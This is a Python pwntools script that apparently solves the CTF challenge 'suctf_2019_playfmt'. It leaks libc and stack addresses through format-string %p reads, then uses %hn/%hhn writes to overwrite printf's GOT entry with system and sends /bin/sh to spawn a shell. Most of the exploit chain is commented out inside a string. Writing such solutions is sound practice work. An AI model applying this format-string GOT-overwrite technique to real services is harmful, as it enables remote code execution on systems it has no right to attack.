#coding=utf-8
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
context.update( os = 'linux', timeout = 1)

#p = remote("node3.buuoj.cn","28548")

p = process("./suctf_2019_playfmt")
#gdb.attach(p,"b *0x0804854F")

printf_got = 0x804A010

payload = "%15$p,%6$p,"
p.sendlineafter("Magic echo Server\n=====================\n",payload)
gdb.attach(p)
pause()
'''
p.recvuntil("0x")
start_addr = int(p.recv(8),16) - 247
log.info("leak_addr:" +  hex(start_addr))

p.recvuntil("0x")
stack_addr = int(p.recv(8),16)
log.info("leak_stack_addr:" +  hex(stack_addr))

libc = LibcSearcher("__libc_start_main",start_addr)
base_addr = start_addr- libc.dump("__libc_start_main")
system_addr = base_addr + libc.dump("system")

print hex(system_addr)

payload =  "%"+str((stack_addr - 4) & 0xff ) +"c%6$hhn"
p.sendlineafter("=====",payload)
payload = "%"+str( printf_got & 0xffff)+"c%10$hn"
p.sendlineafter("=====",payload)

payload =  "%"+str((stack_addr - 12) & 0xff ) +"c%6$hhn"
p.sendlineafter("=====",payload)
payload = "%"+str( (printf_got + 2)& 0xffff)+"c%10$hn"
p.sendlineafter("=====",payload)

num1 = (system_addr >> 16) & 0xff 
num2 = system_addr & 0xffff 
print hex(num1)
print hex(num2)

payload = "%" + str(num1) +"c%7$hhn"
payload += "%"+ str(num2-num1) +"c%9$hn"

p.sendlineafter("=====",payload)


payload = "/bin/sh\x00"
p.sendline(payload)
'''
p.interactive()

#本地泄露出的__libc_start_main和远程不一样...建议改一下libc